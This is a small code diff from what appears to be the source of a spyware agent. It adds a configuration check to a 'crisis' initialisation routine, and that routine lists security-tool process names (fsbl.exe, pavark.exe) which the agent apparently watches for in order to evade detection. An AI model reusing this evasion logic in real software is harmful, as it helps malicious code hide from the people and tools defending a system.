@@ -147,6 +147,10 @@ DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
 	wcscpy(process_crisis_system[0], L"fsbl.exe");
 	wcscpy(process_crisis_system[1], L"pavark.exe");
 		
+	// Se non ci sono i due oggetti allora non lo inizializza
+	if (!elem[L"network"]->IsObject() || !elem[L"hook"]->IsObject())
+		return 1;
+
 	network = elem[L"network"]->AsObject();
 	hook = elem[L"hook"]->AsObject();
 	cr_check_network = (BOOL) network[L"enabled"]->AsBool();
